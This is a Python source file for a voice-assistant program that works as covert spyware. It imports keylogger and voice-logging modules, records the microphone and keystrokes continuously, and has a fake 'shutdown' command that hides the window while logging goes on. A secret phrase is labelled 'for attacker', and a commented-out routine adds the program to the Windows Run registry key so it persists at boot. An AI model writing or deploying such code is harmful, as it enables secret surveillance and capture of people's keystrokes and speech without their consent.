import os
import sys
import time
import webbrowser
from datetime import datetime
from pynput.keyboard import Key, Controller
from pynput import keyboard
import speech_recognition as sr
from gtts import gTTS

from notif import close_notif, real_close_notif
from hide import hide
from voicelogger import voice_logger
from voice_assistant import va_commands
from keylogger import key_logger, on_press

COMMAND_PHRASE = "python"
FALSE_SHUTDOWN = "shutdown"
SHUTDOWN_PHRASE = "6841"
last_keystroke = datetime.now()

# Listens for voices via microphone and transcibes it into text
def get_audio():
  global COMMAND_PHRASE
  r = sr.Recognizer()
  # Opted not to calibrate to ambient noise since a delay is required
  # r.adjust_for_ambient_noise(source)
  with sr.Microphone() as source:
    audio = r.listen(source)
    said = ""
    try:
      resp = r.recognize_google(audio)
      said = resp.lower()
      # If the command prhase is heard, execute appropriate functionality
      if said.split()[0] == COMMAND_PHRASE:
        print(said)
        if said.split()[1] == FALSE_SHUTDOWN:
          false_shutdown()
        elif said.split()[1] == "change":
          COMMAND_PHRASE = said.split()[2]
          print("Command phrase changed to {}".format(said.split()[2]))
        else:
          va_commands(" ".join(said.split()[1:]))
      voice_logger(said)
    except Exception as e:
      # print("Unrecognised audio")
      pass

  return said

def false_shutdown():
  global COMMAND_PHRASE
  # "pi" will never be picked up as the assistant will hear "pie" instead
  COMMAND_PHRASE = "pi"
  hide()
  close_notif()

if __name__ == "__main__":
  print("Setting up environment...")
  # Starts listening for keyboard input
  listener = keyboard.Listener(
      on_press=on_press)
  listener.start()

  print("Ready for Operation")
  # Continuously takes input from the microphone
  while True:
    res = get_audio()
    # Only for debugging or for attacker
    if res == SHUTDOWN_PHRASE:
      voice_logger("SESSION_ENDED")
      real_close_notif()
      sys.exit()

# Below code cane be used to add program to window registry
# This would allow the program to boot during computer startup which would the
# program to behave more malicious. I opted not to include this in the build
# as depending on the user's own system this can be risky and may cause issues.

# import winreg as reg
# import os

# def AddToRegistry():

#     pth = os.path.dirname(os.path.realpath(__file__))

#     s_name="main.py"

#     address=os.join(pth,s_name)

#     key = HKEY_CURRENT_USER
#     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"

#     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)

#     reg.SetValueEx(open,"voice_assist",0,reg.REG_SZ,address)

#     reg.CloseKey(open)